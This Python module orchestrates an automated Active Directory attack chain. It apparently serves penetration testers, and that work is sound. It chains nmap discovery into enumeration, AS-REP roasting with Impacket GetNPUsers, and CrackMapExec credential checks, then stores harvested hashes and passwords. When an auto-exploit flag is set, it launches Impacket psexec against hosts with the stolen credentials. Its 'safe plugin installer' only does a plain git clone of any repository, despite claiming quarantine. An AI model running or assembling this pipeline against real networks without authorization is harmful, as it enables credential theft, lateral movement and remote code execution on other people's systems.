#!/usr/bin/env python3
"""
Orchestrator & Parsers for AD Command Runner
--------------------------------------------

This module is intended to be used together with `ad_command_runner.py`.
It implements:
- ParserRegistry for extensible parsers
- SessionStore to keep discovered credentials/hashes/shells
- Orchestrator that schedules follow-up jobs based on parser output
- Several parsers for common AD tools (nmap XML, enum4linux, ldapdomaindump zips,
  CrackMapExec JSON, Impacket GetNPUsers, secretsdump, BloodHound zips)
- A safe plugin installer helper (git clone into quarantined dir)

Design notes:
- Parsers are heuristic and should be extended/tuned to match the exact outputs
  and versions of the tools you run.
- The orchestrator deliberately requires explicit opt-in for automatic
  exploitation via AutoExploitPolicy.

Usage:
    from ad_command_runner import JobStore, CommandRunner
    from orchestrator_and_parsers import Orchestrator, SessionStore, parser_registry

    store = JobStore('./ad_runner.db')
    runner = CommandRunner(store)
    sessions = SessionStore(store)
    orch = Orchestrator(store, runner, sessions)

    # schedule a discovery job, orch will spawn follow-ups automatically
    job_id = store.create_job('nmap-discovery', ['nmap','-oX','-','-p','88,389,445','10.10.0.0/24'])
    asyncio.create_task(orch._run_and_process(job_id))

"""

import asyncio
import json
import os
import re
import time
import zipfile
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Dict, Any, List, Optional

# Import JobStore and CommandRunner from the main ad_command_runner module. If
# you keep both files in the same directory, this import will work.
try:
    from ad_command_runner import JobStore, CommandRunner
except Exception:
    # allowing this file to be syntax-checked independently
    JobStore = None
    CommandRunner = None


class ParserRegistry:
    def __init__(self):
        self._parsers = {}

    def register(self, name: str):
        def _inner(fn):
            self._parsers[name] = fn
            return fn
        return _inner

    def get(self, name: str):
        return self._parsers.get(name)

    def all(self):
        return dict(self._parsers)


parser_registry = ParserRegistry()


class SessionStore:
    def __init__(self, db: Optional[JobStore] = None):
        self.db = db
        self.sessions: List[Dict[str, Any]] = []

    def add_session(self, session: Dict[str, Any]):
        # session: {type: 'cred'|'hash'|'shell', source_job: id, details: {...}}
        session.setdefault('first_seen', time.time())
        self.sessions.append(session)

    def list(self):
        return list(self.sessions)


class AutoExploitPolicy:
    def __init__(self, allow: bool = False):
        self.allow = allow


class Orchestrator:
    def __init__(self, store: JobStore, runner: CommandRunner, session_store: SessionStore, max_workers: int = 4):
        self.store = store
        self.runner = runner
        self.session_store = session_store
        self.executor = ThreadPoolExecutor(max_workers=max_workers)
        self.auto_exploit = AutoExploitPolicy(allow=False)
        self.dependencies = defaultdict(list)

    def set_auto_exploit(self, allow: bool):
        self.auto_exploit.allow = allow

    def schedule_job(self, name: str, command: List[str], cwd: Optional[str] = None, env: Optional[Dict[str, str]] = None, meta: Optional[Dict[str, Any]] = None, parent_job: Optional[int] = None) -> int:
        job_id = self.store.create_job(name, command, cwd=cwd, env=env, meta=meta)
        if parent_job:
            self.dependencies[parent_job].append(job_id)
        asyncio.create_task(self._run_and_process(job_id))
        return job_id

    async def _run_and_process(self, job_id: int):
        try:
            await self.runner.run_job(job_id)
        except Exception as e:
            self.store.append_output(job_id, 'system', f'ERROR during run: {e}')
            self.store.update_job_status(job_id, 'failed')
            return

        outputs = self.store.fetch_outputs(job_id)
        parsed_results = {}
        for name, parser in parser_registry.all().items():
            try:
                pr = parser(outputs)
            except Exception as e:
                pr = None
                self.store.append_output(job_id, 'system', f'PARSER {name} ERROR: {e}')
            if pr:
                parsed_results[name] = pr
                job = self.store.get_job(job_id)
                meta = json.loads(job.get('meta') or '{}')
                meta.setdefault('parsers', {})[name] = pr
                self.store.update_job_status(job_id, job['status'], meta=meta)

        self._apply_rules(job_id, parsed_results)

    def _apply_rules(self, job_id: int, parsed_results: Dict[str, Any]):
        nmap = parsed_results.get('nmap_xml')
        if nmap:
            for host in nmap:
                ip = host.get('ip')
                ports = {p['port'] for p in host.get('ports', []) if p['state'] == 'open'}
                ad_ports = {88, 389, 636, 3268, 445}
                if ports & ad_ports:
                    meta = {'target': ip, 'triggered_by': job_id}
                    # schedule enumeration jobs
                    self.schedule_job('enum4linux', ['enum4linux-ng', '-a', ip], meta=meta, parent_job=job_id)
                    self.schedule_job('ldapdomaindump', ['ldapdomaindump', ip], meta=meta, parent_job=job_id)
                    self.schedule_job('nmap_smb_scripts', ['nmap', '-p', '445', '--script', 'smb-os-discovery,smb-enum-shares,smb-enum-users', ip], meta=meta, parent_job=job_id)
                    self.schedule_job('getnpusers', ['python3', '-m', 'impacket.examples.GetNPUsers', '-no-pass', ip], meta=meta, parent_job=job_id)
                    self.schedule_job('cme_scan', ['crackmapexec', 'smb', ip, '--shares', '--pass-pol', '--local-auth', '--json'], meta=meta, parent_job=job_id)

        getnp = parsed_results.get('impacket_getnp')
        if getnp:
            asreps = getnp.get('asreps', [])
            if asreps:
                for h in asreps:
                    self.session_store.add_session({'type': 'hash', 'source_job': job_id, 'details': h})
                self.store.append_output(job_id, 'system', f'FOUND {len(asreps)} AS-REP hashes; stored in sessions')

        cme = parsed_results.get('crackmapexec_json')
        if cme:
            creds = cme.get('valid_credentials', [])
            for cred in creds:
                self.session_store.add_session({'type': 'cred', 'source_job': job_id, 'details': cred})
                self.store.append_output(job_id, 'system', f'Valid credential found: {cred}')
                if self.auto_exploit.allow:
                    self._launch_exploits_for_cred(cred, job_id)

    def _launch_exploits_for_cred(self, cred: Dict[str, Any], parent_job: int):
        target = cred.get('ip')
        username = cred.get('username')
        password = cred.get('password')
        if not (target and username and password):
            return
        meta = {'target': target, 'triggered_by': parent_job, 'cred': {'u': username}}
        self.schedule_job('psexec', ['python3', '-m', 'impacket.examples.psexec', f'{target}', username, password], meta=meta, parent_job=parent_job)


# --- Parsers ---
@parser_registry.register('nmap_xml')
def parser_nmap_xml(outputs: List[Dict[str, Any]]):
    # Collect stdout lines and attempt to parse XML
    stdout_lines = [o['line'] for o in outputs if o['source'] == 'stdout']
    text = '\n'.join(stdout_lines).strip()
    if not text:
        return None
    try:
        import xml.etree.ElementTree as ET
        root = ET.fromstring(text.encode('utf-8'))
    except Exception:
        return None
    hosts = []
    for h in root.findall('host'):
        ip = None
        addr = h.find('address')
        if addr is not None:
            ip = addr.get('addr')
        ports = []
        ports_node = h.find('ports')
        if ports_node is not None:
            for p in ports_node.findall('port'):
                portnum = p.get('portid')
                state = p.find('state').get('state') if p.find('state') is not None else 'unknown'
                service = p.find('service').get('name') if p.find('service') is not None else None
                try:
                    ports.append({'port': int(portnum), 'state': state, 'service': service})
                except Exception:
                    pass
        hosts.append({'ip': ip, 'ports': ports})
    return hosts


@parser_registry.register('impacket_getnp')
def parser_impacket_getnp(outputs: List[Dict[str, Any]]):
    found = {'asreps': []}
    for o in outputs:
        if o['source'] != 'stdout':
            continue
        line = o['line']
        if '$krb5asrep$' in line or 'ASREPRoast' in line or 'AS-REP' in line:
            found['asreps'].append({'line': line})
    return found if found['asreps'] else None


@parser_registry.register('crackmapexec_json')
def parser_crackmapexec_json(outputs: List[Dict[str, Any]]):
    creds = []
    services = []
    for o in outputs:
        if o['source'] != 'stdout':
            continue
        line = o['line'].strip()
        if not line:
            continue
        try:
            obj = json.loads(line)
        except Exception:
            continue
        if isinstance(obj, dict):
            svc = obj.get('service') or obj.get('module')
            if svc:
                services.append(obj)
            auth = obj.get('authentication') or obj.get('auth')
            if auth and auth.get('success'):
                creds.append({'ip': obj.get('target'), 'username': auth.get('username'), 'password': auth.get('password')})
    result = {}
    if creds:
        result['valid_credentials'] = creds
    if services:
        result['services'] = services
    return result if result else None


@parser_registry.register('enum4linux')
def parser_enum4linux(outputs: List[Dict[str, Any]]):
    text = '\n'.join(o['line'] for o in outputs if o['source'] == 'stdout')
    if not text:
        return None
    dom = {}
    m = re.search(r"Domain\s*:\s*(\S+)", text)
    if m:
        dom['domain'] = m.group(1)
    users = re.findall(r"\bUser:\s*(\S+)", text)
    if users:
        dom['users'] = users
    shares = re.findall(r"Share:\s*(\S+)", text)
    if shares:
        dom['shares'] = shares
    return dom if dom else None


@parser_registry.register('ldapdomaindump_zip')
def parser_ldapdomaindump(outputs: List[Dict[str, Any]]):
    for o in outputs:
        if o['source'] != 'stdout':
            continue
        line = o['line']
        m = re.search(r"wrote to\s*(\S+\.zip)", line)
        if m:
            path = m.group(1)
            try:
                with zipfile.ZipFile(path, 'r') as zf:
                    names = zf.namelist()
                    found = {'zip': path, 'files': names}
                    for name in names:
                        if name.endswith('.json') and 'schema' not in name.lower():
                            with zf.open(name) as f:
                                try:
                                    data = json.load(f)
                                    found.setdefault('jsons', {})[name] = data
                                except Exception:
                                    pass
                    return found
            except Exception as e:
                return {'error': f'unable to open zip {path}: {e}'}
    return None


@parser_registry.register('bloodhound_zip')
def parser_bloodhound_zip(outputs: List[Dict[str, Any]]):
    for o in outputs:
        if o['source'] != 'stdout':
            continue
        m = re.search(r"Wrote output to\s*(\S+\.zip)", o['line'])
        if m:
            path = m.group(1)
            try:
                with zipfile.ZipFile(path, 'r') as zf:
                    names = zf.namelist()
                    summary = {'zip': path, 'files': names}
                    for target in ('Computers.json', 'Users.json'):
                        for name in names:
                            if name.endswith(target):
                                with zf.open(name) as f:
                                    try:
                                        data = json.load(f)
                                        summary[target] = {'count': len(data)}
                                    except Exception:
                                        pass
                    return summary
            except Exception as e:
                return {'error': f'cannot open {path}: {e}'}
    return None


@parser_registry.register('impacket_secretsdump')
def parser_impacket_secretsdump(outputs: List[Dict[str, Any]]):
    found_hashes = []
    for o in outputs:
        if o['source'] != 'stdout':
            continue
        line = o['line']
        parts = line.split(':')
        if len(parts) >= 4 and re.fullmatch(r'[0-9a-fA-F]{32}', parts[3] if len(parts) > 3 else ''):
            found_hashes.append({'line': line})
    return {'hashes': found_hashes} if found_hashes else None


@parser_registry.register('rdp_check')
def parser_rdp_check(outputs: List[Dict[str, Any]]):
    for o in outputs:
        if 'Authentication only, exit status 0' in o['line']:
            return {'rdp_auth_success': True}
    return None


def install_plugin_from_github(github_repo: str, dest_dir: str = './plugins', branch: str = 'main') -> str:
    dest = Path(dest_dir)
    dest.mkdir(parents=True, exist_ok=True)
    name = github_repo.split('/')[-1]
    clone_path = dest / f"{name}-{int(time.time())}"
    cmd = ['git', 'clone', '--depth', '1', '--branch', branch, f'https://github.com/{github_repo}.git', str(clone_path)]
    import subprocess
    try:
        subprocess.check_output(cmd, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        raise RuntimeError(f'git clone failed: {e.output.decode()[:400]}')
    return str(clone_path)


# --- Demo helper ---
async def orchestration_demo():
    if JobStore is None or CommandRunner is None:
        print('ad_command_runner module not importable; place both files together to run the demo')
        return
    store = JobStore('./ad_runner.db')
    runner = CommandRunner(store, logs_dir='./logs')
    sessions = SessionStore(store)
    orch = Orchestrator(store, runner, sessions)

    def lst(ev):
        ts = time.strftime('%H:%M:%S', time.localtime(ev['timestamp']))
        print(f"[{ts}] {ev['source']}: {ev['line']}")

    nmap_cmd = ['nmap', '-oX', '-', '-p', '88,389,445,636,3268', '10.10.0.0/24']
    j = store.create_job('nmap-discovery', nmap_cmd, cwd='.', env=dict(os.environ), meta={'phase': 'discovery'})
    runner.add_listener(j, lst)
    asyncio.create_task(orch._run_and_process(j))

    await asyncio.sleep(10)
